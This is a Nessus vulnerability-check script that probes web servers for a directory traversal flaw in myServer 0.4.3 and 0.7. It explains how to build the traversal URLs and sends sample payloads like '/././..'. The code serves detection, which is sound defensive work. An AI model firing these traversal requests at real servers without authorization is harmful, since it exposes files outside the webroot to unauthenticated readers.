#
# This script was written by Paul Johnston of Westpoint Ltd <paul@westpoint.ltd.uk>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11851);
 script_version ("$Revision: 1.4 $");

 name["english"] = "myServer 0.4.3 / 0.7 Directory Traversal Vulnerability";
 script_name(english:name["english"]);

 desc["english"] = "
This web server is running myServer <= 0.4.3 or 0.7. This version contains
a directory traversal vulnerability, that allows remote users with
no authentication to read files outside the webroot.

You have to create a dot-dot URL with the same number of '/./' and '/../'
+ 1. For example, you can use :
/././..
/./././../..
/././././../../..
/./././././../../../..
etc...
or a long URL starting with ./././. etc.

More information : http://www.securityfocus.com/archive/1/339145

Solution : Upgrade to myServer 0.7.1 or later
Risk factor : High";


 script_description(english:desc["english"]);

 summary["english"] = "Attempts to retrieve the path '/././..'";
 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);
 script_copyright(english:"Author Paul Johnston paul@westpoint.ltd.uk, Copyright (C) 2003 Westpoint Ltd");
 script_family(english:"CGI abuses");

 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

# In fact, myServer 0.7 is also vulnerable to the first URL.
# However, as the bug was supposed to be fixed in 0.4.3 and reappeared in 
# 0.7, I think that checking every avatar is safer.

foreach pattern (make_list("/././..", "././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../"))
{
 req = http_get(item: pattern, port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if(res == NULL) exit(0);

 if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 ", string:res)
    && egrep(pattern:"Contents of folder \.\.", string:res, icase:1))
 {
  security_hole(port);
  exit(0);
 }
}
